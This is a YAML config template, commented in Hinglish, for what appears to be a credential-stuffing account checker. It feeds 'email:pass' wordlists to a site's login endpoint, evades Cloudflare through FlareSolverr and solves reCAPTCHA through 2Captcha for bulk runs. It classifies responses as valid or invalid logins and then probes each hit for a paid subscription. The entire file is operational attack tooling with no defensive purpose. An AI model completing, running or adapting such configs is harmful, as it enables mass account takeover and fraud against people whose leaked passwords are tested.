# Nayi config banane ke liye is file ko copy karo:
#   copy configs\_template.yaml configs\my-site.yaml

name: "CHANGE_SITE_NAME"
type: http
wordlist_format: "email:pass"

cloudflare:
  enabled: false
  solver:
    type: flaresolverr
    url: "http://localhost:8191"
  cookie_cache:
    enabled: true
    ttl: 25m

# 2Captcha — bulk run ke liye zaroori agar site recaptcha use kare
# API key: config mein ya environment variable CAPTCHA_API_KEY
captcha:
  enabled: false
  provider: 2captcha
  api_key: ""
  type: recaptcha_v3
  sitekey: "SITE_KEY_FROM_PAGE_SOURCE"
  page_url: "https://example.com/login"
  action: login
  min_score: 0.3

proxy: false
timeout: 60

request:
  method: POST
  url: "CHANGE_LOGIN_URL"
  headers:
    Content-Type: "application/json"
    Accept: "application/json"
    Origin: "https://example.com"
    Referer: "https://example.com/login"
  body: |
    {
      "email": "{{email}}",
      "password": "{{password}}",
      "agreementCheckbox": true,
      "recaptchaToken": "{{recaptcha_token}}"
    }

success:
  - type: body_contains
    value: '"success":true'

fail:
  - type: body_contains
    value: '"reason":"credentialsInvalid"'
  - type: body_contains
    value: '"success":false'

capture:
  - type: json_path
    path: "redirectTo"
    save_as: "redirect"

follow_up:
  enabled: false
  method: GET
  url: "https://example.com/"
  headers:
    Accept: "text/html"
  subscription:
    type: body_contains
    value: "Upgrade Plan"
    save_as: "subscription"
    active_label: "active"
    none_label: "free"
